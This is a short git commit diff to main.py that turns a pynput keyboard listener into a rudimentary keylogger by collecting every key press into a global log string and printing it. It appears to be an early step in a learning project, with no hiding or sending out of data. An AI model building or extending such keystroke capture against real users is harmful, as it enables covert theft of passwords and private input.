b7c89d65973042311703f8d268c561ac3d772182
= <mustafayevaxmadjon@gmail.com>
2024-10-20 20:42:38 +0500

    global variables

--- main.py
+++ main.py
@@ -1,9 +1,12 @@
 # !/usr/bin/env python
 
 import pynput.keyboard
+log = ""
 
 def proccess_key_press(key):
-  print(key)
+  global log
+  log = log + str(key)
+  print(log)
 
 keyboard_listener = pynput.keyboard.Listener(on_press=proccess_key_press)
 
